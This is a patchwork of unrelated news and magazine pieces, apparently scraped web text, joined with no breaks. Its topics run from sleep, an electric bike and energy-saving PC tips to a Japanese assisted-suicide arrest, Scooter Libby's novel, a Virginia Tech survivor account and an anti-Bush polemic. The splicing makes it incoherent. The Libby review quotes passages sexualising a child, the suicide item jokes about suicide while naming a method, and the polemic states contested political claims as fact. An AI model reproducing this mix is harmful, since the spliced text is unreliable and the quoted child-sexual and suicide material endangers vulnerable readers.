Does that make any sense ?
If you have ever wondered about why people have to sleep or what causes dreams , then read on .
In this article , you 'll find out all about sleep and what it does for you .

Characteristics of Sleep
We all know how sleep looks -- when we see someone sleeping , we recognize the following characteristics :
If possible , the person will lie down to go to sleep .
The person 's eyes are closed .
The person does n't hear anything unless it is a loud noise .
The person breathes in a slow , rhythmic pattern .
The person 's muscles are completely relaxed .
If sitting up , the person may fall out of his or her chair as sleep deepens .
During sleep , the person occasionally rolls over or rearranges his or her body .
This happens approximately once or twice an hour .
This may be the body 's way of making sure that no part of the body or skin has its circulation cut off for too long a period of time .
In addition to these outward signs , the heart slows down and the brain does some pretty funky things ( we 'll get to this later ) .
In other words , a sleeping person is unconscious to most things happening in the environment .
The biggest difference between someone who is asleep and someone who has fainted or gone into a coma is the fact that a sleeping person can be aroused if the stimulus is strong enough .
If you shake the person , yell loudly or flash a bright light , a sleeping person will wake up .
For any animal living in the wild , it just does n't seem very smart to design in a mandatory eight - hour period of near - total unconsciousness every day .
Yet that is exactly what evolution has done .
So there must be a pretty good reason for it !
­­Reptiles , birds and mammals all sleep .
That is , they become unconscious to their surroundings for periods of time .
Some fish and amphibians reduce their awareness but do not ever become unconscious like the higher vertebrates do .
Insects do not appear to sleep , although they may become inactive in daylight or darkness .
By studying brainwaves , it is known that reptiles do not dream .
Birds dream a little .
Mammals all dream during sleep .
Different animals sleep in different ways .
Some animals , like humans , prefer to sleep in one long session .
Other animals ( dogs , for example ) like to sleep in many short bursts .
Some sleep at night , while others sleep during t­he day .
So much for YouTube taking the high ground and not sticking annoying bumper ads in front of their clips … that 's pretty much their exact plan for making money in 2008 .
Hey , they 've gotta make back that $ 1.65 billion somehow , right ?
The plan as of now is to slap 30 - second ads in front of clips .
It is n't clear if there 'll be shorter ads as well , if the ads will go in front of every clip , or if the ads will be skippable .
I can tell you one thing : there ain't no way I 'm sitting through 30 torturous seconds of advertising for a 15 second video of a guy lighting his farts on fire .

UPDATE : False alarm , this is an old story and Google has since changed their plans to the overlay ads we reported earlier .
Police in Japan arrested a man who ran an internet suicide help site for allegedly being a little too helpful .
Kazunari Saito , a 33 - year - old electrician , was taken into custody yesterday for allegedly giving Sayaka Nishizawa , 21 , sleeping pills and afterwards suffocating her — all at the victim 's previous request to die .
Saito allegedly met Nishizawa through a suicide website he hosted .
( The site offered tips on how to commit suicide , as opposed merely making the user want to commit suicide — we 're looking at you , 4 chan ) .
According to officials , Nishizawa paid about $ 1,700 ( 200,000 yen ) to release herself from this mortal coil .
( We 'll also point out the website 's advice must have been rubbish , given the necessity to follow the pills with an uncouth suffocation chaser ) .
Japanese news website Asahi.com reports that Saito visited Nishizawa 's apartment on April 12 and gave her 20 to 30 sleeping pills .
Yet unconfident in his professionalism , Saito allegedly placed a plastic bag over Nishizawa 's head some time later .
" I was asked to ensure she was dead , " the source quoted Saito as saying .
Nishizawa 's body was found April 16 by her father .
Police found notes in her room indicating she wished to commit suicide , but soon suspected foul play because her keys and mobile phone were missing .
Saito reportedly became a suspect when police began investigating suicide - related websites .
On his site , Saito allegedly posted some rather incriminating messages such as :
" Revenge , drugs , assisted suicide , et cetera .
I will do anything .
For more details and rates , go to the web site or email me , " according to officials .
Police say Saito also sold prescription sleeping pills through his site to several individuals in Tokyo .
He was previously arrested July 24 on drug charges .
Japan has one of the highest suicide rates among industrialized nations .
According to a study done by Yokohama City University researchers , suicides in 2006 surpassed 30,000 for the ninth straight year .
It 's somewhat of a national pastime there — like baseball in the US , but with less downtime involved . ®
October 31 , 2007 Matra Manufacturing & Services ( Matra MS ) has turned its attention to the production of Light Electric Vehicles with the release of numerous high - performance electric bicycles and quadricyles beginning in 2006 .
The latest offering from the company renowned for its past achievements in the automotive design arena – including a stint in Formula
One in which it won a world title ( with Jackie Stewart driving in 1969 ) and winning the Le Mans 24 hour race with its own V12 engines - is the MS1 , a “ Human Electric Hybrid Motorcycle ” shown recently in Paris that is expected to hit the market in the spring of 2008 .
Powered by a 1 kW Motor
Wheel , the MS1 has its maximum speed limited to 28 mph ( 45 kmh ) in electric mode and can travel up to 62 miles ( 100 km ) - depending on type of battery - on purely electric power … and if you run out of juice there is always the ever - reliable ( 9 - speed ) pedal - option .
The aluminum frame hybrid weighs in at just 40 kg ( with batteries ) and features 100 mm suspension forks and 400 mm front disc brakes up front , plus regenerative braking to extend the battery life .
Recharging time is estimated at 3 – 6 hours .
The MS1 starts via a magnetic card swiped through the LCD display on the handlebars ( which also indicates remaining battery power and speed ) and an electric alarm is included along with LED lights for night - time commuting .
Another notable feature often omitted from both motorcycle and bicycle design is the ability to adjust the height and depth of the saddle and handlebars .
Matra MS ( known Matra Automobile before it began to wind down its automobile construction activities ) cites some very good reasons for entering the light electric vehicle market : 40 % of errands and trips do not exceed 2 km , and 80 % do not exceed 5 km , cars move at an average of 18 km hour in city traffic ( no matter what ’s under the bonnet ) and transportation is responsible for 70 % of particle emissions and for 40 % of nitrogen oxide emissions , half of which is due to cars .
Conventional motorcycles are n’t really any better – polluting almost as much as cars and making twice as much noise .
Matra MS plans to expand its Light Electric Vehicle product line in coming years as it pursues its Neighborhood Electric Transport Solutions ( STEP ) program promoting economically competitive , noiseless and emissions free transport .
This includes fostering " lean manufacturing " , both under its own brand name as well as others ( for which negotiations are in progress ) .
Few details are available on the exact release dates or price of the MS1 ( though reports have it at around € 3,500 ( $ 4,951 ) but we will certainly be keeping an eye out for this one - stay tuned .

Of all the scribbled sentences that have converged to create the Valerie Plame affair , the most remarkable , in literary terms , may belong to Scooter Libby , Dick Cheney ’s recently deposed chief of staff .
“ Out West , where you vacation , the aspens will already be turning .
They turn in clusters , because their roots connect them .
Come back to work — and life , ” he wrote in a jailhouse note to Judith Miller .
Meant as a waiver of confidentiality , the letter touched off the sort of fevered exegesis more often associated with readings of “ The Waste Land ” than of legal correspondence .
For even more difficult prose , however , one must revisit an earlier work .
“ The Apprentice ” — Libby ’s 1996 entry in the long and distinguished annals of the right - wing dirty novel — tells the tale of Setsuo , a courageous virgin innkeeper who finds himself on the brink of love and war .
Libby has a lot to live up to as a conservative author of erotic fiction .
As an article in SPY magazine pointed out in 1988 , from Safire ( “ [ She ] finally came to him in the bed and shouted ‘ Arragghrrorwr ! ’ in his ear , bit his neck , plunged her head between his legs and devoured him ” ) to Buckley ( “ I ’d rather do this with you than play cards ” ) to Liddy ( “ T’sa Li froze , her lips still enclosing Rand ’s glans . . . ” ) to Ehrlichman ( “ ‘ It felt like a little tongue ’ ” ) to O’Reilly ( “ Okay , Shannon Michaels , off with those pants ” ) , extracurricular creative writing has long been an outlet for ideas that might not fly at , say , the National Prayer Breakfast .
In one of Lynne Cheney ’s books , a Republican vice - president dies of a heart attack while having sex with his mistress .
It took Libby more than twenty years to write “ The Apprentice , ” which is set in a remote Japanese province in the winter of 1903 .
The book is brimming with quasi-political intrigue and antique locutions —
“ The girl who wore the cloak of yellow fur ” ; “ one wore backward a European hat ” — that make the phrase a “ former Hill staffer , ” by comparison , seem straightforward .
Like his predecessors , Libby does not shy from the scatological .
The narrative makes generous mention of lice , snot , drunkenness , bad breath , torture , urine , “ turds , ” armpits , arm hair , neck hair , pubic hair , pus , boils , and blood ( regular and menstrual ) .
One passage goes , “ At length he walked around to the deer ’s head and , reaching into his pants , struggled for a moment and then pulled out his penis .
He began to piss in the snow just in front of the deer ’s nostrils . ”
Homoeroticism and incest also figure as themes .
The main female character , Yukiko , draws hair on the “ mound ” of a little girl .
The brothers of a dead samurai have sex with his daughter .
Many things glisten ( mouths , hair , evergreens ) , quiver ( a “ pink underlip , ” arm muscles , legs ) , and are sniffed ( floorboards , sheets , fingers ) .
The cast includes a dwarf , and an “ assistant headman ” who comes to restore order after a crime at the inn .
( Might this character be autobiographical ?
And , if so , would that have made Libby the assistant headman or the assistant headman ’s assistant ? )
When it comes to depicting scenes of romance , however , Libby can evoke a sort of musty sweetness ; while one critic deemed “ The Apprentice ” “ reminiscent of Rembrandt , ” certain passages can better be described as reminiscent of Penthouse Forum .
There is , for example , Yukiko ’s seduction of the inexperienced apprentice :
He could feel her heart beneath his hands .
He moved his hands slowly lower still and she arched her back to help him and her lower leg came against his .
He held her breasts in his hands .
Oddly , he thought , the lower one might be larger .
. . .
One of her breasts now hung loosely in his hand near his face and he knew not how best to touch her .
Other sex scenes are less conventional .
Where his Republican predecessors can seem embarrassingly awkward — the written equivalent of trying to cop a feel while pinning on a corsage — Libby is unabashed :
At age ten the madam put the child in a cage with a bear trained to couple with young girls so the girls would be frigid and not fall in love with their patrons .
They fed her through the bars and aroused the bear with a stick when it seemed to lose interest .
And , finally :
He asked if they should fuck the deer .
The answer , reader , is yes .
So , how does Libby stack up against the competition ?
This question was put to Nancy Sladek , the editor of Britain ’s Literary Review , which , each year , holds a contest for bad sex writing in fiction .
( In 1998 , someone nominated the Starr Report . )
Sladek agreed to review a few passages from Libby .
“ That ’s a bit depraved , is n’t it , this kind of thing about bears and young girls ?
That ’s particularly nasty , and the other ones are just boring , ” she said .
“ God , they ’re an odd bunch , these Republicans . ”
Unlike their American counterparts , she said , Tories have n’t taken much to sex writing .
“ They usually just get caught , ” she said .
LOS ANGELES ( Reuters ) - California Gov. Arnold Schwarzenegger said on Friday he wants markets to set policies on low carbon fuels , and called for eliminating subsidies and tariffs related to ethanol .
“ We need to take down the barriers we have created , ” Schwarzenegger said at a symposium on low carbon fuels at the Lawrence Berkeley National Lab in Berkeley , California .
The United States , he said , subsidizes domestic corn - based ethanol and imposes a 54 - cents - per - gallon tariff to limit cheap ethanol imports from Brazil .
“ It makes absolutely no sense .
It ’s crazy , and it ’s definitely not in the best interest of the customers , ” said Schwarzenegger .
Brazil , which uses sugar - based ethanol , is the No. 2 producer of the biofuel after the United States and its corn - based fuel .
He did not offer specific alternatives to the tariffs and subsidies , but said the market should be allowed to come up with the best solutions after targets are set by governments like California’s .
“ We set the targets .
The market decides how best to get there , ” Schwarzenegger said .
The booming U.S. ethanol production has increased corn costs and in turn feed costs for chickens , hogs and cattle .
The result is a $ 47 - per- person increase since last July in the average U.S. grocery bill , a study issued last week by Iowa State University found .
U.S. fuel ethanol gets a 51 - cents - per - gallon tax subsidy .
The low carbon fuel symposium held Friday is a method to allow the markets to decide the best way forward on alternative fuels , the governor said .
The governor in January called for California to set a “ low carbon fuel standard ” meant to cut carbon emissions in transportation fuels by 10 percent by 2020 .
Schwarzenegger on Friday said the federal government ’s help is essential in establishing standards that stakeholders -- from industry to scientists to environmentalists -- can then strive to meet .
He called on the U.S. Congress “ to adopt a fuel policy that works . ”
Transportation accounts for about 40 percent of the climate changing carbon emissions in California , and the state now relies on petroleum - based fuels for 96 percent of its transportation fuels .
Record gasoline prices can also be helped by less reliance on oil - based fuels and more on alternatives that cut carbon emissions , Schwarzenegger said .
Travel and motor club AAA on Friday said the U.S. average for regular gasoline was $ 3.13 per gallon , and $ 3.46 per gallon in California .
“ The low carbon fuel standard is our best weapon against rising oil prices and gas prices , ” Schwarzenegger said .
“ A vibrant market in alternative fuels and alternative vehicles and alternative engines give customers a great choice , and that empowers the customers to say , ‘ No , ’ to these high fuel prices .
To say , ‘ Hasta la vista , baby , ’ “
The fast - moving pace of technology is good news for gadget lovers , but not such good news for the environment .
As we acquire more and more electronic products , an explosion in e-waste ( electronic scrap ) containing toxic chemicals that cannot be disposed of safely is a growing concern .
To make environmental matters worse , devices are burning up more energy than they need to through being left on while not in use .
The blame lies with both PC users and manufacturers .
Last year saw campaign group Greenpeace take on Apple , slamming its lack of environmental policies and non-existent plan to reduce its eco-impact .
Apple CEO
Steve Jobs rectified this in May , when he posted environmental targets online .
Other PC makers have been making a lot of noise about their energy efficiency , reducing carbon footprints and cutting non-renewable or toxic components .
PC
World 's carbon - neutral PC has been picking up a lot of press attention , while Intel has been working on energy - efficient Santa Rosa and Centrino processors and rolling them out into various laptops .
Laptops that have flash memory rather than hard disks are another green choice .
With no platter to spin , far less energy is required to write data to memory .
They 're a pricey option at the moment - Sony 's Vaio TZ18GN costs $ 700 ( about £ 350 ) more than its hard disk version , and has a 32 GB capacity rather than 100GB - but we expect to see prices drop as more are launched .
1. Set Sleep
Time for your PC
If you do n't tap your keyboard for 10 minutes , your PC will often go to sleep .
Your PC 's screen is probably set to go into power - saving mode after a preset period .
Although they 're not as power - hungry as old - style CRT displays , you can still save a great deal by having your flat - panel power off in this manner .
To adjust the setting for your PC or laptop , go to Control Panel , Power Options and select a screen power - off schedule to suit .
Note that screensavers do n't reduce energy consumption .
You can also enable PC hibernation but , as with standby mode for other devices , this does n't completely power down your PC .
It 's all too easy to assume you 're keeping costs and power consumption down , even though the current is still flowing .
You 'll see different power scheme options for desktop and laptop PCs .
Your laptop can automatically adjust its power options depending on whether you 're running it from batteries or mains power .
You 'll find a range of energy - use calculators online , such as Energy Star 's ( eu-energystar.org ) .
The savings you can make depend on how much you use your PC and the size of your screen , but could be £ 50 a year or more .

2 . Turn it all off
According to a study by Fujitsu , the UK wastes £ 123 m powering PCs left on out of hours .
That 's not only a lot of wasted energy - it 's a lot of money too .
An individual computer left on all the time costs about £ 37 a year to run .
Switch it off at night and weekends and this figure can be reduced to just £ 10 a year .
The energy saved could make almost 35,000 cups of coffee , according to the Carbon Trust .
Some argue that a PC should be left on all the time because turning it on and off causes stress to the computer 's components .
But if this were the case , the vast majority of PCs would suffer from such damage .
They do n't .
Another argument against turning off a computer is the energy required to start it up again .
To be as green as can be , consider turning off your PC if it 's going to be inactive for more than 16 minutes .
Beyond this time , the energy needed to run it outweighs the energy required at startup .
If you leave your PC on overnight because you do n't like waiting for it to start up first thing each day , set it to turn on automatically a few minutes before you arrive at the office .
Restart your PC , hitting the Setup menu key before Windows loads .
Tab to the Power Management Options and enable the alarm and select a suitable time for your PC to restart .
You can also schedule your computer to shut down - a good option if you like to leave it on for your backup program to run after you leave the office .
Turn on the printer only when you are ready to print .
Printers consume energy even when idle .
Similarly , a scanner sucks power in ready mode .
Photocopiers are energy guzzlers too .
Even when your PC is turned off , a phone charger plugged into your USB port will continue to draw energy .
3 . Stop leaking power
It 's not enough to just switch off the computer .
If you really want to make sure that the machine is n't drawing power from the mains , you need to physically unplug the computer or get out of your seat and switch it off at the wall .
When you shut off your computer and the monitor goes black , your display is actually in standby mode and waiting for the PC to switch back on .
Digital cameras , mobile phones and iPod power adaptors that are left plugged in all the time also suck power from the outlet , even after you 've disconnected the devices you were charging .
When you leave the adaptor plugged in , you 're losing an average of 2W .
The simplest way of ensuring that all your computer 's peripherals are completely turned off is to connect them to a power strip that you can simply switch off .
Several companies have caught on to the publicity surrounding standby energy wastage and offer timer and standby switches .
For home or office use , Micromark 's £ 21 timer plug will soon pay for itself in energy savings , while Bye Bye Standby lets you turn off several devices around the home from a central point .
4. Be an Energy Star
Energy Star stickers used to be seen plastered all over CRT screens that were unusual in having standby modes .
Flat - panels use far less energy than CRTs , but buying an LCD monitor is n't the only way to conserve power .
Look for the Energy Star logo when buying printers , fax machines , scanners and other products .
Energy Star
To find products which meet strict green standards , look for the Energy Star logo
Energy Star is an initiative that promotes energy - efficient hardware .
The scheme saved $ 12bn ( £ 6 bn ) on US utility bills in 2005 .
To get the stamp of approval , products must meet guidelines such as having a low - power sleep mode .
At the Energy Star site ( energy - star.org ) it 's easy to find products that meet the guidelines .
It lets you search by category , brand and feature .
5 . Use a flat - panel display
Next time you 're looking to replace your PC monitor you should at least ensure that it 's a TFT model .
Old - style CRT displays typically use 75 W of power , while 25W is more typical of a flat - panel 's lighter footprint .
As well as drawing three times as much power so they can illuminate the phosphors that make up the display , CRTs contain a vast amount more lead than flat - panel displays .
A typical CRT contains approximately 1.36 kg of lead , while some LCDs contain only a few grammes .
Philips has gone so far as to eliminate the lead content of some of its screens , such as the 19in 190C8FS .
Thankfully , CRTs are on their way out , while pressure from campaigners mean more and more products will attain certification for the responsible way they have been manufactured and their low impact on the environment .
According to the Energy Saving Trust , a DAB radio uses 10 to 20 times less energy than the same broadcast via a digital TV .
6. Know your RoHS
ROHSThe European Union implemented RoHS ( Restriction of Hazardous Substances directive ) in July 2006 .
The directive restricts the use of lead , mercury , cadmium , hexavalent chromium , polybrominated biphenyls and polybrominated diphenyl ether in the manufacture of electronics .
Anything that 's available for sale or import within the EU should now comply with RoHS .
However , it 's not a foolproof piece of legislation .
Apple 's Steve Jobs claims some companies are using loopholes in the RoHS directive to continue to use toxic chemicals in their products .
These companies claim their products meet requirements " because of certain little - known exemptions granted by the EU " , he says .
7 . Go paper - free
Another way to do your bit for the environment , as well as save time and money , is by going digital .
We waste more paper than we do anything else .
The average office employee uses up to 50 sheets of A4 every day , according to Envirowise .
Much of this paper is thrown away - the group estimates that UK businesses throw away five million tonnes of printing and writing paper each year .
If you can't stop printing altogether , set your device to print double - sided by default or create your own writing pad from discarded printouts .
Learn to resist the urge to print out emails and other documents for filing .
Instead , read them onscreen and store them on your hard drive .
If you need a record , create a PDF file .
If you do n't already have a PDF creation package , try Backup4all novaPDF Lite 5.1 , which can create PDFs of documents from within any Windows application .
Next time you find a web page you 'd like to read later , do n't print it .
Select File , Print , click the PDF pop -up menu in the dialog box and choose Save To PDF .
You do need backups of important files , but back them up to your hard drive .
8 . Is your journey really necessary ?
There are all sorts of ways of offsetting your carbon footprint .
The most effective is not to travel unless it 's really necessary .
Travelling not only requires you to spend money on plane tickets and a hotel , but also includes a hidden cost .
We checked out how heavy a burden a couple of intercontinental business trips plus a package holiday break within Europe could be .
Our 10,000 lb total ( according to terrapass.com ) is alarmingly high .
Broadband connections , webcams , video - conferencing and webcasting tools , along with email , ought to make many business trips unnecessary .
If you have to fly but are concerned about the CO2 you 'll create , consider donating to an organisation such as Native Energy or TerraPass .
These companies calculate your impact and suggest a monetary donation to go towards projects such as building renewable energy sources .
9 . Do n't dump your Computers
Dispose of your old hardware responsibly .
Consumer electronics and computers contain toxic materials , such as lead , that can seep into the ground if dumped improperly .
British Computer Society president Nigel Shadbolt explains : " PCs contain many toxic components , so if they end up in a landfill we are creating a real problem for the future . ”
This is bad news , according to energy minister Malcolm Wicks .
" Electrical and electronic equipment is the fastest - growing category of waste across the EU , with an estimated 17 - 20kg per person produced every year .
The UK alone generated about one million tonnes of waste equipment last year , " he says .
An older PC may no longer meet your requirements , but there are plenty of people who'd love to use it .
Many charities will take an old PC and peripherals off your hands , or you can get in touch with Computer Aid , which refurbishes machines for use by schools and in the developing world .
You could even sell it on eBay or give it away through Freecycle .
Failing that , recycle it .
According to the WEEE directive , electrical and electronic waste has to be dealt with separately from other rubbish so that hazardous elements can be stripped out .
Electronics manufacturers and vendors cover the cost of this ; your task is to get them to collect it , return it to them or take it to your council 's recycling centre .
If you can't transport it , arrange for the council to pick it up .
Many electrical retailers run take - back schemes - check your PC vendor for details about how it is dealing with WEEE compliance .
Note that you should n't have to pay to return end - of - life goods .
But , you can't be too careful where stored personal details are concerned .
10 .
The sunny side
If you 're seeking clean power for energy - hungry gadgets , consider looking to the sun .
Solar power is renewable and free - although sunshine can be limited here in the UK .
Be aware that you need direct sunlight to get a good charge with these products .
Cloudy skies and reflections on windows can cause problems .
Voltaic 's £ 189 Solar Back Pack consists of three solar panels embedded in the outside of the bag that generate up to 4W of power .
The bags have 11 adaptors for mobile phones and other devices , but are not designed to charge laptops .
If a solar - powered bag is n't for you , choose a less expensive charger that fits in your hand .
The £ 45 Solio charger from Better Energy Systems gives about one hour of playtime or 10 minutes ' talk time from one hour of sunshine , according to the maker .
Whether you 'll find a whole hour 's worth of sunshine within the British Isles is another matter .
Other solar chargers include the Freeloader ( £ 99 from Firebox ) .
If you 've got your PC or laptop switched on and have a couple of ports free , you could do worse than power up a pair of USBCell batteries for future use .
Laptop PCs require a little more power : unlimited - power.co.uk stocks Uni-solar Portable Solar Electric
Panels that can be used for this purpose .
The marketing material states that they can provide power even with bullet holes or in partial shade , which suggests that these are really designed with the army in mind , but they are worth investigating .
Prices start at £ 451 .
Wind - up chargers are also available , although their efficiency is somewhat limited .
For example , the Multi Mobile Charger ( £6 from iwoot.com ) gives you eight minutes ' talk time on your mobile if you wind it up for three minutes .
But why stop at your gadgets ?
If you install a renewable energy source - such as solar panels , wind turbines or biomass heaters - in your home , you may be eligible for a grant .
11 . Give it away
For all our talk about the digital , paperless office , we 've yet to hear of anyone achieving it .
As well as saving on ink costs by printing at small point sizes and in draft or economy mode , you can minimise waste by recycling cartridges via organisations such as laserxchange .co.uk .
If your office does n't have a dedicated charity it supports , Oxfam , Childline and ActionAid and a number of smaller charities can benefit from your thoughtfulness .
Similarly , hand back your old and unloved mobile phone handsets .
T - Mobile is offering £ 80 cashback , while Carphone Warehouse tempts you with a more modest £ 20 .
If you want to avoid the smooth sales talk , the charities we 've outlined can also earn revenue from your philanthropy .

But there is another compelling reason to get into the habit of saving .
( Here is where this column also turns into advice for the older folks who are giving you this to read . )
People who save a lot get used to a lower rate of consumption while working , so less money is needed in retirement .
Stretching to save a little more yields a double dividend .
You accumulate more assets and you lower the amount you will need in retirement because you will not have the habit of spending extravagantly to feel fulfilled .
Inevitably though , we return to the question :
How can you possibly afford to put away that much ?
If you are only making $ 40,000 , a not - untypical starting salary for a college - educated professional in a big city , the weekly gross of $ 769 works down to $ 561 in take - home pay after income taxes and payroll taxes for Social Security and Medicaid .
Were you to divert 10 percent of your salary to a 401 ( k ) plan , the bottom line becomes $ 509 .
In other words , a regular habit of savings costs you $ 52 a week .
You easily frittered that away last week on things that you cannot even recall this week .
A useful exercise that proves the point :
For a week , try to list everywhere you spend cash or use your credit card .
Could you save another 10 percent a week , or $ 50 ?
If you do , you are nearly set for life .
Can you live on $ 1,950 a month ?
Rents being what they are in certain cities like New York , San Francisco or Washington , sure , it will be tight .
People do it by finding a roommate and watching their expenses ( or asking for an occasional handout from Mom and Dad ) .
There may be another compelling reason to save and that is that while many aspects of retirement savings are predictable , the big unknowable is health care costs .
“ If you believe in the logic of the life cycle model , then once you get used to peanut butter , all else follows , ” said Jonathan Skinner , a economics professor at Dartmouth College who has studied retirement issues and recently wrote a paper titled “ Are You Sure You ’re Saving Enough for Retirement ? ” for the National Bureau of Economic Research .
“ That ’s the assumption that I am questioning : Do people want to be stuck in peanut butter in retirement ? ”
CHRISTIANSBURG , Va.  Colin Goddard thought the gunman had run out of bullets .
Or maybe he was hiding inside the classroom waiting to shoot it out with police .
Only later , would the Virginia Tech student realize that he may have been Seung - Hui Cho 's last victim before the deranged killer turned his gun on himself .
" Almost immediately after I got shot , there was no more , " said Goddard in a bedside interview Saturday at Carilion New River Valley Medical Center here .
" When he stopped shooting , that was the first time it got quiet . "
So ended the worst shooting massacre in modern U.S. history .
And of the 32 who died , more lost their lives inside 211 Norris Hall than any other location .
Of the 18 people in that room , only one emerged unscathed .
Twelve died , including French teacher Jocelyne Couture - Nowak .
Five students , including Goddard , were wounded .
" It was terrifying , " said Goddard , 21 .
Yet , oddly , being shot was nothing like he had ever imagined .
" It did n't hurt as much as I thought it was going to , " he said .
" It felt like a big push of air and then a sting . "
Surgeons Wednesday placed a rod in Goddard 's left leg to support his fractured femur .
He hopes doctors will release him Sunday and that with physical therapy he will be able to walk unaided in six weeks .
That should give him enough time to be ready for an internship in Madagascar this summer that he hopes will help improve his French .
Yet if Goddard 's physical wounds are expected to heal soon , the psychic toll of that day may take longer .
Late for French class
Goddard 's alarm went off at 8:40 a.m. last Monday morning .
He was late for his 9:05 a.m. French class .
Goddard was taking the class as part of his international studies major .
The son of international aid workers who was born in Kenya and lived in Somalia , Bangladesh , Indonesia and Egypt , where he graduated high school , and had spent just six years living in the United States , he chose Virginia Tech in part because it had so many foreign students .
The other reason , said his mother , Anne Lynam Goddard , was because the school was in a small town and would be easier for him to maneuver in than Cairo .
After stopping to pick up his friend , Kristina Heeger , 20 , of Vienna , Va. , he walked into Madame Couture - Nowak 's class five minute late .
The students first learned something was amiss when a female classmate walked in at 9:30 a.m. , saying she 'd been detained because of a shooting at a dorm .
Fifteen minutes later they heard what Goddard described as " pop , pop , popping sounds . "
A former ROTC cadet who had fired M - 16 rifles , he thought to himself that this sound was different .
The teacher became worried .
" All semester we 've heard loud noises and banging " from a nearby construction site , Goddard said .
" When we heard it , we assured her it was just hammering . "
But Couture - Nowak sensed this was something else .
She went to the door , opened it and slammed it shut .
" When she closed the door she was very terrified , " Goddard says .
" She told us to call 911 , told us to get to the ground .
That was the last time I saw her . "
Goddard 's desk was in a corner near the back of the room where the door was .
From there , he dialed 911 but the dispatcher could n't hear him and kept asking where he was located .
It was then that the wooden door began to splinter in a hail of bullets .
Within seconds , Cho pushed his way inside .
Goddard dropped the phone and tried to shush the dispatcher for fear her voice would draw the shooter 's attention to him .
Crouching beneath his desk , the 6 ' 3 " student 's legs and arms exposed , he saw a man wearing greenish pants , a white shirt , heavy boots and pistol harnesses on each arm .
Goddard saw only as high as the man 's shoulders , never looking in the eye the man who came to kill him .
Cho walked wordlessly from the door to the window and began walking up and down the rows of desks , firing execution - style as he went .
When he came to Goddard , he shot a bullet that entered the student 's knee and exited from his upper thigh .
Then , as soon as he had burst into the room , Cho was gone .
Inside the room , the smell of gunpowder was thick .
" Some people were whimpering , " Goddard said .
Another made a gurgling sound .
Nobody moved .
Ten minutes later , the gunman was back .
Again , he moved to the window and " made multiple passes around the room and shot multiple people multiple times … .
He had been shooting very rapidly in succession and reloading quickly .
He reloaded in our room a few times .
He kept dropping clips and changing them out , " said Goddard , who had his eyes open .
" I was very alert and conscious throughout the whole thing . "
That is , until Cho got near him , his boot nearly brushing Goddard 's leg .
Trying to play dead , the student closed his eyes as the gunman emptied two more bullets into him .
One entered under his right armpit and exited his shoulder .
Another went into his right buttock .
Goddard heard one or two more shots .
Then , nothing .
Silence .
Minutes went by .
Turning to his friend Kristina , who had been shot in the back and was trying to get up , Goddard asked , " ' Is he here ?
Do you see anybody ? '
She said , ' No , I do n't see him . ' "
The police were soon outside the room but could n't get in because a body —
Goddard still does n't know if it was Cho 's or one of his victims — was blocking the door .
A classmate , the only one who was n't shot , got up and moved it out of the way .
" As soon as the police entered the room they said , ' Shooter down !
Shooter down ! "
That 's when Goddard knew , " It was all over . "
' Pain 's getting less every day '
A police triage team tagged the occupants of Room 211 .
The shooter , and 12 others , were black tagged .
Others in serious condition were red .
Goddard was yellow , serious but not critical .
" I knew I was n't shot in anything vital and was going to live , " says Goddard , who believes the desk protected his torso .
He and the other survivors were carried out and placed on the grass in a freezing , howling wind .
Still , paramedics cut off his clothes in search of bullet entry and exit points .
They found five before loading him in an ambulance and taking him to the hospital .
Five days later , wearing a white and blue hospital gown while surrounded by his parents , aunts and other relatives , Goddard said he was still tired but " The pain 's getting less every day , getting more movement in all my joints and all my muscles .
I feel myself improving everyday . "

In the administration of George W. Bush , the Republican Party has achieved the greatest combination of idiocy and evil in human history .
The Republicans have bogged America down in a gratuitous and illegal war .
The war has destroyed Iraq , killed between 650,000 and 1,000,000 Iraqi civilians , displaced 4,000,000 Iraqis , and littered the country with depleted uranium .
Bush ’s war remains unwon despite its five - year duration and $ 1 trillion in out - of - pocket and incurred future costs .
Bush ’s invasion of Iraq is a war crime under the Nuremberg standard , a direct counterpart to Hitler ’s invasion of Poland .
Both were based on lies and deception , and the declared reasons for both were masks for secret agendas .
Bush ’s invasions of Afghanistan and Iraq , his planned attack on Iran , and his support for Israel ’s attack on Lebanon and policies toward the Palestinians have radicalized the Middle East and Muslims worldwide .
Western aggression has vindicated Osama bin Laden ’s propaganda , produced massive recruits for Al Qaeda , and unleashed destabilizing forces throughout the Middle East
Bush ’s wars are strengthening Islam .
Abdullah Gul has just been elected president of Turkey .
Gul is described by the American media as " former Islamist . "
Gul is supported by the ruling political party of prime minister Erdogan , another " former Islamist . "
Gul ’s election to the presidency by 76 % of the Turkish parliament has upset Turkey ’s secularized military , long in the pay of the US government .
On August 27 Turkey ’s military chief , General Yasar Buyukanit , declared that " centers of evil systematically try to corrode the secular nature of the Turkish Republic . "
The Turkish military , many believe at the request and pay of the US , has overthrown four Turkish governments since 1960 , the last only 10 years ago .
With President Bush ’s rant about " bringing democracy to the Middle East , " the Turkish military is less able to impose Western values on an Islamic people .
Similarly , the American puppet in Egypt cannot as easily suppress the Islamic values and aspirations of Egyptians .
US puppet rulers in Jordan and Pakistan , and even the Saudis and oil emirates , report the ground shaking under their feet .
America ’s puppet in Pakistan is in trouble , and his difficulties are compounded by US military incursions into Pakistan .
The Bush administration is considering contingency plans to seize Pakistan ’s nuclear weapons in the event the American puppet is overthrown , delusional contingency plans considering the over - stretched US military .
In the postwar years , the US managed with its money and influence to secularize an elite class in Middle Eastern countries , an elite that identifies with the West and not with their own cultures .
This artificial elite has produced a wide political gap between the masses of the people and the rulers .
Increasingly , Muslim masses perceive their rulers as allied with foreign powers against them .
In Iraq the American puppet government of Nuri al - Maliki seems to be on its last legs .
The Sunnis have pulled their support , as has the most important Shi’ite leader , Muqtada al - Sadr , who realizes that the Maliki government is too complicit in US crimes to be a legitimate government of Iraq .
With both the Bush administration and Congress blaming Maliki for America ’s failure in Iraq , Maliki ’s fate looks increasingly to be that of Ngo Dinh Diem , America ’s Vietnam puppet who was blamed for the failure of US intervention in Vietnam .
Just as Hitler long denied German defeats on the Russian front and even in his last days was ordering non-existent German divisions to relieve Berlin , the Bush regime finds a new straw to grasp in Iraq each time the previous straw proves to be a delusion .
The latest straw is " the surge . "
While Americans surge , the British have been defeated in southern Iraq and have withdrawn to two bases in eerie similarity to the French at Dien Bien Phu .
The British bases are subjected to between 30 and 60 mortar and rocket attacks each day .
British generals want their troops out of Iraq .
The longer UK prime minister Brown keeps them in Iraq in order to appease the Bush administration , the harder it will be to rescue the survivors .
With American retreat south to Kuwait now potentially cut off , how will the US extract its troops and equipment when American defeat can no longer be denied ?
